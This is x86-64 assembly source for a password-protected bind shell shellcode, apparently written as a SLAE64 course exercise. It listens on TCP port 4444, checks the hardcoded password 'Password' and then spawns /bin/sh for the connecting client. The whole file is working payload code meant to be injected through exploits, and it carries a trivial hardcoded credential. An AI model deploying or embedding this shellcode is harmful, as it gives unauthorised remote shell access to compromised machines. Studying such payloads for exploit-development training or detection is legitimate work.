;Bind_TCP 4444  with password                        ;
;Default password = Password                         ;
;If connected the shellcode no prompt for password   ;
;Enter password directly and you get the bin/sh shell;
;if password is wrong the shellcode exit:            ;
;Christophe G SLAE64 - 1337 size 173 bytes           ;



global _start



_start:


; sock = socket(AF_INET, SOCK_STREAM, 0)
; AF_INET = 2
; SOCK_STREAM = 1
; syscall number 41

push 0x29
pop rax
push 0x2
pop rdi
push 0x1
pop rsi
xchg rbx , rdx
syscall

; copy socket descriptor to rdi for future use
xchg rax , rdi


; server.sin_family = AF_INET
; server.sin_port = htons(PORT)
; server.sin_addr.s_addr = INADDR_ANY
; bzero(&server.sin_zero, 8)

xor rax, rax

mov dword [rsp - 4] , eax
mov word [rsp - 6] ,0x5c11
mov byte [rsp - 8] , 0x2
sub rsp , 8


; bind(sock, (struct sockaddr *)&server, sockaddr_len)
; syscall number 49
push 0x31
pop rax
mov rsi, rsp
push 0x10
pop rdx
syscall


; listen(sock, MAX_CLIENTS)
; syscall number 50

push 0x32
pop rax
push 0x2
pop rsi
syscall


; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
; syscall number 43


push 0x2b
pop rax
sub rsp, 0x10
mov rsi, rsp
push 0x10
mov rdx, rsp

syscall

; store the client socket description
mov r9, rax

; close parent
push 0x3
pop rax
syscall





xchg rdi , r9
xor rsi , rsi

dup2:
    push 0x21
    pop rax
    syscall
    inc rsi
    cmp rsi , 0x2
    loopne dup2

CheckPass:
    xor rax , rax
    push 0x10
    pop rdx
    sub rsp , 16                 ; 16 bytes to receive user input
    mov rsi , rsp
    xor edi , edi
    syscall                      ; system read function call
    mov rax , 0x64726f7773736150 ; "Password"
    lea rdi , [rel rsi]
    scasq
    jz Execve
    push 0x3c
    pop rax
    syscall





Execve:
    xor rax , rax
    mov rdx , rax
    push rax

    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; store /bin//sh address in RDI
    mov rdi, rsp

    ; Second NULL push
    push rax


    ; Push address of /bin//sh
    push rdi

    ; set RSI
    mov rsi, rsp

    ; Call the Execve syscall
    push 0x3b
    pop rax
    syscall